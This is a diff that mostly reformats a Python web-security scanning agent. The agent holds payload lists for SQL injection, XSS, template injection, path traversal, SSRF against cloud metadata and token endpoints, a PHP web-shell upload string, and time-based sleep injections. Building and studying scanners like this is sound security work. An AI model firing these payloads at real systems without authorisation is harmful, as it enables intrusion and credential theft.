@@ -1,10 +1,9 @@
 """Web security agent for vulnerability scanning."""
 
-import asyncio
 import logging
 import re
 import time
-from typing import Optional, Dict, Any, List
+from typing import Optional
 
 import httpx
 from secagents.agents.base import BaseAgent, AgentConfig, AgentOutput, AgentRole
@@ -15,7 +14,7 @@ logger = logging.getLogger(__name__)
 
 class WebSecurityAgent(BaseAgent):
     """Tests web vulnerabilities: XSS, SQLi, SSRF, LFI, RCE, SSTI, etc.
-    
+
     Responsibilities:
     - Generate context-aware payloads
     - Test multiple vulnerability types
@@ -35,7 +34,12 @@ class WebSecurityAgent(BaseAgent):
                 r"ODBC.*Driver",
                 r"Division by zero",
             ],
-            "payloads": ["' OR '1'='1", "' UNION SELECT NULL--", "'; SELECT 1/0--", "') OR ('1'='1"],
+            "payloads": [
+                "' OR '1'='1",
+                "' UNION SELECT NULL--",
+                "'; SELECT 1/0--",
+                "') OR ('1'='1",
+            ],
         },
         "xss": {
             "patterns": [
@@ -59,14 +63,14 @@ class WebSecurityAgent(BaseAgent):
                 r"\[%.*%\]",
                 r"49",  # 7*7 result
                 r"72",  # 8*9 result
-                r"7777777", # 7*'7' result (Jinja2)
+                r"7777777",  # 7*'7' result (Jinja2)
             ],
             "payloads": [
                 "{{7*7}}",
                 "${7*7}",
                 "[%7*7%]",
                 "{{7*'7'}}",
-                "<%= 7*7 %>", # ERB
+                "<%= 7*7 %>",  # ERB
             ],
         },
         "lfi": {
@@ -94,16 +98,16 @@ class WebSecurityAgent(BaseAgent):
             ],
             "payloads": [
                 "http://169.254.169.254/latest/meta-data/",
-                "http://2130706433", # Decimal IP
-                "http://0177.0.0.1", # Octal IP
-                "http://0x7f.0x0.0x0.0x1", # Hex IP
-                "http://127.1", # Short IP
-                "http://[::1]", # IPv6
-                "http://[::ffff:127.0.0.1]", # IPv6 mapped
+                "http://2130706433",  # Decimal IP
+                "http://0177.0.0.1",  # Octal IP
+                "http://0x7f.0x0.0x0.0x1",  # Hex IP
+                "http://127.1",  # Short IP
+                "http://[::1]",  # IPv6
+                "http://[::ffff:127.0.0.1]",  # IPv6 mapped
                 "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
-                "http://attacker.com#@127.0.0.1", # URL parser confusion
-                "http://[::ffff:0x7f000001]", # Mixed hex IPv6
-                "http://local.gd", # DNS Rebinding (example)
+                "http://attacker.com#@127.0.0.1",  # URL parser confusion
+                "http://[::ffff:0x7f000001]",  # Mixed hex IPv6
+                "http://local.gd",  # DNS Rebinding (example)
             ],
         },
         "rce": {
@@ -138,7 +142,7 @@ class WebSecurityAgent(BaseAgent):
                 r"\"constructor\":",
             ],
             "payloads": [
-                "{\"__proto__\": {\"admin\": true}}",
+                '{"__proto__": {"admin": true}}',
                 "?__proto__[isAdmin]=true",
             ],
         },
@@ -156,9 +160,9 @@ class WebSecurityAgent(BaseAgent):
                 "shell.php5",
                 "shell.php%00.jpg",
                 "shell.jpg.php",
-                "GIF89a; <?php system($_GET['cmd']); ?>", # Magic bytes + PHP
-                "<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>", # SVG XSS
-                "../../../etc/passwd", # Zip slip / Filename injection
+                "GIF89a; <?php system($_GET['cmd']); ?>",  # Magic bytes + PHP
+                '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',  # SVG XSS
+                "../../../etc/passwd",  # Zip slip / Filename injection
                 "shell.phtml",
             ],
         },
@@ -177,28 +181,26 @@ class WebSecurityAgent(BaseAgent):
             "$(sleep {delay})",
         ],
         "ssti": [
-            "{{{{_self.env.registerUndefinedFilterCallback(\"sleep\")}}}}{{{{_self.env.getFilter(\"{delay}\")}}}}",
-        ]
+            '{{{{_self.env.registerUndefinedFilterCallback("sleep")}}}}{{{{_self.env.getFilter("{delay}")}}}}',
+        ],
     }
 
     def __init__(self):
-        super().__init__(AgentConfig(
-            role=AgentRole.WEB_SECURITY,
-            name="web_security",
-            tools=["http_request", "payload_generate", "response_analyze"],
-            timeout_seconds=300.0,
-        ))
+        super().__init__(
+            AgentConfig(
+                role=AgentRole.WEB_SECURITY,
+                name="web_security",
+                tools=["http_request", "payload_generate", "response_analyze"],
+                timeout_seconds=300.0,
+            )
+        )
         self.logger = logging.getLogger("secagents.web_security")
         self._client: Optional[httpx.AsyncClient] = None
 
     @property
     def client(self) -> httpx.AsyncClient:
         if self._client is None:
-            self._client = httpx.AsyncClient(
-                timeout=10.0,
-                follow_redirects=True,
-                verify=False
-            )
+            self._client = httpx.AsyncClient(timeout=10.0, follow_redirects=True, verify=False)
         return self._client
 
     def base_system_prompt(self) -> str:
@@ -261,7 +263,9 @@ class WebSecurityAgent(BaseAgent):
                 await self._client.aclose()
                 self._client = None
 
-    async def _test_endpoints(self, endpoints: list[str], vuln_types: list[str], target: str) -> list[dict]:
+    async def _test_endpoints(
+        self, endpoints: list[str], vuln_types: list[str], target: str
+    ) -> list[dict]:
         """Test multiple endpoints for vulnerabilities."""
         findings = []
 
@@ -275,7 +279,7 @@ class WebSecurityAgent(BaseAgent):
 
     async def _test(self, endpoint: str, vuln_type: str, target: str) -> Optional[dict]:
         """Test a single endpoint for a vulnerability type."""
-        
+
         # 1. Content-based testing
         if vuln_type in self.VULN_SIGNATURES:
             sig = self.VULN_SIGNATURES[vuln_type]
@@ -290,7 +294,7 @@ class WebSecurityAgent(BaseAgent):
                         "confidence": 0.8,
                         "severity": self._get_severity(vuln_type),
                         "cwe": self._get_cwe(vuln_type),
-                        "method": "content-based"
+                        "method": "content-based",
                     }
 
         # 2. Time-based testing (Linear Scaling)
@@ -305,22 +309,22 @@ class WebSecurityAgent(BaseAgent):
         """Linear-scaling time-based verification."""
         payloads = self.TIME_BASED_PAYLOADS[vuln_type]
         delays = [2, 5]
-        
+
         for base_payload in payloads:
             is_vulnerable = True
             latencies = []
-            
+
             for delay in delays:
                 payload = base_payload.format(delay=delay)
                 start_time = time.time()
                 await self._send_payload(endpoint, payload, target)
                 latency = time.time() - start_time
                 latencies.append(latency)
-                
+
                 if latency < delay:
                     is_vulnerable = False
                     break
-            
+
             if is_vulnerable and latencies[1] > latencies[0]:
                 return {
                     "type": vuln_type,
@@ -330,7 +334,7 @@ class WebSecurityAgent(BaseAgent):
                     "severity": self._get_severity(vuln_type),
                     "cwe": self._get_cwe(vuln_type),
                     "method": "time-based-linear",
-                    "latencies": latencies
+                    "latencies": latencies,
                 }
         return None
 
